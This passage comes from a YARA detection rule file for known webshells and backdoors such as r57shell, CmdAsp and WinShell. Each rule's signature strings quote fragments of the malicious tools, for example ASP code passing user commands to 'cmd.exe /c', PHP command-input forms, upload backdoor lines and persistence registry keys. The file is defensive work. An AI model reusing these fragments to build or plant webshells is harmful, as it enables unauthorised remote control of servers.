		all of them
}

rule SIGNATURE_BASE_Editserver_EXE_2
{
	meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "97928144-0112-5288-8f95-acf7a0d56e71"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7381-L7394"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f945de25e0eba3bdaf1455b3a62b9832"
		logic_hash = "d440669b0c0bf575cf9dea946edf55f724300a4c765e90c631fc1eee062bf006"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Server %s Have Been Configured"
		$s5 = "The Server Password Exceeds 32 Characters"
		$s8 = "9--Set Procecess Name To Inject DLL"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Reader_2
{
	meta:
		description = "Webshells Auto-generated - file reader.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "d596f7f4-5b0d-5f17-94d3-2582ec041eb1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7395-L7406"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b598c8b662f2a1f6cc61f291fb0a6fa2"
		logic_hash = "89a948f8da66173965884cd525615c8eeb91cf98a4984c05be7472034bb72f76"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "mailto:mailbomb@hotmail."

	condition:
		all of them
}

rule SIGNATURE_BASE_ASP_Cmdasp_2
{
	meta:
		description = "Webshells Auto-generated - file CmdAsp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e4b48843-1936-5717-b2b6-add5b4a14d04"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7407-L7420"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "79d4f3425f7a89befb0ef3bafe5e332f"
		logic_hash = "84c3148fe74b1afaa6e3bbff0aca8df1f1775759a36a673cc13d35ef7658929c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "' -- Read the output from our command and remove the temp file -- '"
		$s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
		$s9 = "' -- create the COM objects that we will be using -- '"

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Backdoor_V1_2
{
	meta:
		description = "Webshells Auto-generated - file PHP Backdoor v1.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f47298a9-a47c-5088-ab1f-1bd76bfd0ca8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7434-L7447"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0506ba90759d11d78befd21cabf41f3d"
		logic_hash = "396ae1ee34a06ab4863f4f54257a9020b8747fb99dff15372f0aa54fa4598e43"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th"
		$s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy"

	condition:
		all of them
}

rule SIGNATURE_BASE_Svchostdll_2
{
	meta:
		description = "Webshells Auto-generated - file svchostdll.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "b369d702-1f29-56ec-a742-f87d9c42c775"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7448-L7467"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0f6756c8cb0b454c452055f189e4c3f4"
		logic_hash = "4a7a7bb7d827c2e7801f8c33b292bb3d312428fc4ae79f07e103f456984c3b83"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "InstallService"
		$s1 = "RundllInstallA"
		$s2 = "UninstallService"
		$s3 = "&G3 Users In RegistryD"
		$s4 = "OL_SHUTDOWN;I"
		$s5 = "SvcHostDLL.dll"
		$s6 = "RundllUninstallA"
		$s7 = "InternetOpenA"
		$s8 = "Check Cloneomplete"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Server_2
{
	meta:
		description = "Webshells Auto-generated - file server.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "0e4fee1b-8a16-5738-9600-fa965f8c84c2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7468-L7479"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1d38526a215df13c7373da4635541b43"
		logic_hash = "66b8513a532f64af535c948da28674795ae6495b9844165c3b039bf61c25eb46"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageServer Below -->"

	condition:
		all of them
}

rule SIGNATURE_BASE_Vanquish_3
{
	meta:
		description = "Webshells Auto-generated - file vanquish.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "143e5e46-ffbc-5aee-9f9b-13374a6c3c10"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7480-L7493"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "684450adde37a93e8bb362994efc898c"
		logic_hash = "223c59d06a9389f380fa29959c54e53a17b53080f704189ae519b9527b2c6384"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "You cannot delete protected files/folders! Instead, your attempt has been logged"
		$s8 = "?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU"
		$s9 = "?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z"

	condition:
		all of them
}

rule SIGNATURE_BASE_Winshell_2
{
	meta:
		description = "Webshells Auto-generated - file winshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "24edd03a-df71-5d84-9764-ba7903b68064"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7494-L7513"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3144410a37dd4c29d004a814a294ea26"
		logic_hash = "addbfa598039af09c0e4c50138fcfabd16c35c5516259cf9595cf49855da518d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
		$s1 = "WinShell Service"
		$s2 = "__GLOBAL_HEAP_SELECTED"
		$s3 = "__MSVCRT_HEAP_SELECT"
		$s4 = "Provide Windows CmdShell Service"
		$s5 = "URLDownloadToFileA"
		$s6 = "RegisterServiceProcess"
		$s7 = "GetModuleBaseNameA"
		$s8 = "WinShell v5.0 (C)2002 janker.org"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remview_3
{
	meta:
		description = "Webshells Auto-generated - file remview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5040ddbc-2e61-50ca-b738-a4ac8feec3f1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7514-L7527"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b4a09911a5b23e00b55abe546ded691c"
		logic_hash = "19719e8c9215ec9ba9fab55b604907e0a6d0a0507a5662926acff1e9dc03440e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\""
		$s3 = "         echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\""
		$s4 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n<"

	condition:
		all of them
}

rule SIGNATURE_BASE_Saphpshell_2
{
	meta:
		description = "Webshells Auto-generated - file saphpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "42bcd739-714e-5dbf-a3a1-929f3d16ed6f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7528-L7539"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d7bba8def713512ddda14baf9cd6889a"
		logic_hash = "24d558292a709bb29334b1acdc53cdb6c5bc6803caec527edcacd6a19f6dc7c9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006Z_2
{
	meta:
		description = "Webshells Auto-generated - file 2006Z.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7540-L7552"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "fd1b6129abd4ab177fed135e3b665488"
		logic_hash = "4b427132541cd26ee47c387a98f6f46f86808f9a775068e1d114c9ef4abca9f6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "wangyong,czy,allen,lcx,Marcos,kEvin1986,myth"
		$s8 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x"

	condition:
		all of them
}

rule SIGNATURE_BASE_Admin_Ad_2
{
	meta:
		description = "Webshells Auto-generated - file admin-ad.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7d87b4f6-3227-53cb-803c-4f9c7327f203"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7553-L7565"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e6819b8f8ff2f1073f7d46a0b192f43b"
		logic_hash = "0febd10979a959af73332a8e064a510e949109abf863b5fd0fef19b635968d1d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz"
		$s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Casus15_3
{
	meta:
		description = "Webshells Auto-generated - file casus15.php"
		author = "Florian Roth (Nextron Systems)"
		id = "305842e4-26ad-573d-8df3-e32e239e434b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7566-L7577"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8d155b4239d922367af5d0a1b89533a3"
		logic_hash = "58921290952f23ff5b828d8c92c818ebd91b726cdbbc9137b0f55a0e5ca90636"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))"

	condition:
		all of them
}

rule SIGNATURE_BASE_BIN_Client_2
{
	meta:
		description = "Webshells Auto-generated - file Client.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "515ab1b3-7923-55de-8c19-71ef5d9b4366"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7578-L7594"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9f0a74ec81bc2f26f16c5c172b80eca7"
		logic_hash = "e1277f6b7adc2e832a3aad96c7e44796596d2e61eb9247977da3c3569777e0b2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "=====Remote Shell Closed====="
		$s2 = "All Files(*.*)|*.*||"
		$s6 = "WSAStartup Error!"
		$s7 = "SHGetFileInfoA"
		$s8 = "CreateThread False!"
		$s9 = "Port Number Error"

	condition:
		4 of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Uptime_2
{
	meta:
		description = "Webshells Auto-generated - file uptime.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "4f649757-9502-5640-bc17-11cad6c779f4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7595-L7610"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d1f56102bc5d3e2e37ab3ffa392073b9"
		logic_hash = "5d91dda859a63a965250bd4d76565c6adf18e4ee306be3b91965e5d35bc521e8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "JDiamondCSlC~"
		$s1 = "CharactQA"
		$s2 = "$Info: This file is packed with the UPX executable packer $"
		$s5 = "HandlereateConso"
		$s7 = "ION\\System\\FloatingPo"

	condition:
		all of them
}

rule SIGNATURE_BASE_Simple_PHP_Backdoor_2
{
	meta:
		description = "Webshells Auto-generated - file Simple_PHP_BackDooR.php"
		author = "Florian Roth (Nextron Systems)"
		id = "bd7c19b9-e035-5e70-b626-1d210cadc055"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7611-L7624"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a401132363eecc3a1040774bec9cb24f"
		logic_hash = "9739217c23f583452fbf1d7a8e20b2f1379ebf430e0a4fd73ad62e88d544670a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he"
		$s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn"
		$s9 = "// a simple php backdoor"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Sig_2005Gray_2
{
	meta:
		description = "Webshells Auto-generated - file 2005Gray.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "978fb04e-517d-51cf-98ca-5fd6b421365e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7625-L7639"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "75dbe3d3b70a5678225d3e2d78b604cc"
		logic_hash = "927ed5cdaa14b6cd63a6ca7d7bec6635b69fa19d88808890e7d198fb7a0b57b4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SCROLLBAR-FACE-COLOR: #e8e7e7;"
		$s4 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s8 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
		$s9 = "SCROLLBAR-3DLIGHT-COLOR: #cccccc;"

	condition:
		all of them
}

rule SIGNATURE_BASE_Dllinjection_2
{
	meta:
		description = "Webshells Auto-generated - file DllInjection.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8a57e122-fd00-57f3-94db-736c5bfd76db"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7640-L7651"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a7b92283a5102886ab8aee2bc5c8d718"
		logic_hash = "6e01ae1cc8a91a5e0d22bdf477aa72bf0116dbe31752a069b1e34d8a09ec6213"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\BDoor\\DllInjecti"

	condition:
		all of them
}

rule SIGNATURE_BASE_Mithril_V1_45_Mithril_2
{
	meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3c160017-0332-532a-bb7f-390a4a34dc4e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7652-L7664"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f1484f882dc381dde6eaa0b80ef64a07"
		logic_hash = "a3e74bfb34762553eccaddd745d9e17dc3a5a25201e4bc9e2ea9a49342295c78"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "cress.exe"
		$s7 = "\\Debug\\Mithril."

	condition:
		all of them
}

rule SIGNATURE_BASE_Hkshell_Hkrmv_2
{
	meta:
		description = "Webshells Auto-generated - file hkrmv.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "986fad12-9198-5e0a-88d6-a9be6963ff8c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7665-L7677"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "bd3a0b7a6b5536f8d96f50956560e9bf"
		logic_hash = "f1da0778456272e6d93633a564018bdf0fa74f1db1c9e963a03a59c69c752b6e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "/THUMBPOSITION7"
		$s6 = "\\EvilBlade\\"

	condition:
		all of them
}

rule SIGNATURE_BASE_WEBSHELL_PHP_1_2
{
	meta:
		description = "Webshells Auto-generated - file phpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d0107af3-e484-54cf-a238-dd1e71efd3f6"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "phpshell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7678-L7692"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1dccb1ea9f24ffbd085571c88585517b"
		logic_hash = "eed450ae6668bbee01ea2689e9864f10a66714ec4c91afabb12609ad4ebdac8c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "echo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><b"
		$s2 = "$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_UR"
		$s3 = "$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", "

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Cmd_2
{
	meta:
		description = "Webshells Auto-generated - file cmd.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "f7a74f21-aec9-5ee7-a80e-0fe34b977a71"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7693-L7705"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cbe8e365d41dd3cd8e462ca434cf385f"
		logic_hash = "43f3379a57210f0e3b70575313115a7ba3d71359de7c5ac9a6a178b93af3545e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
		$s1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Phpft_2
{
	meta:
		description = "Webshells Auto-generated - file phpft.php"
		author = "Florian Roth (Nextron Systems)"
		id = "00bc690b-4977-5076-a40a-edd39c37233f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7706-L7718"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "60ef80175fcc6a879ca57c54226646b1"
		logic_hash = "741536acafdc4da618d69bdae2f0a3e8c004a4027cc76c796158ee111c006414"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "PHP Files Thief"
		$s11 = "http://www.4ngel.net"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Indexer_3
{
	meta:
		description = "Webshells Auto-generated - file indexer.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "fba053d7-5413-563f-8c27-0554349500b2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7719-L7730"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "135fc50f85228691b401848caef3be9e"
		logic_hash = "a1bfba9c24819f5c1574aa179d853a6cc2fcf58c7b9a14eeab2639248178549c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r"

	condition:
		all of them
}

rule SIGNATURE_BASE_R57Shell_4
{
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1f1070e8-e82c-5cae-a64a-cd5028adae97"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7731-L7742"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8023394542cddf8aee5dec6072ed02b5"
		logic_hash = "40ff6bceb3f9bd95fbf5e75681fadadaa64243007e10fcc86bb909282b8161c5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to"

	condition:
		all of them
}

rule SIGNATURE_BASE_Bdcli100_2
{
	meta:
		description = "Webshells Auto-generated - file bdcli100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c74e8822-9556-5596-a130-c6e0120d7103"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7743-L7755"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b12163ac53789fb4f62e4f17a8c2e028"
		logic_hash = "48c70413c71d5a84f8cea48c77935b7cc26d9e1348d7ab257de4540d69f0f817"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "unable to connect to "
		$s8 = "backdoor is corrupted on "

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_2005Red_2
{
	meta:
		description = "Webshells Auto-generated - file 2005Red.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "963effd9-f31d-5238-9419-b5dd11822e56"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7756-L7769"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d8ccda2214b3f6eabd4502a050eb8fe8"
		logic_hash = "716b6faa8d1216f592d63b658cdd65d7be0226bf746b5fdf1827bdf881562711"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "scrollbar-darkshadow-color:#FF9DBB;"
		$s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006X2_2
{
	meta:
		description = "Webshells Auto-generated - file 2006X2.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
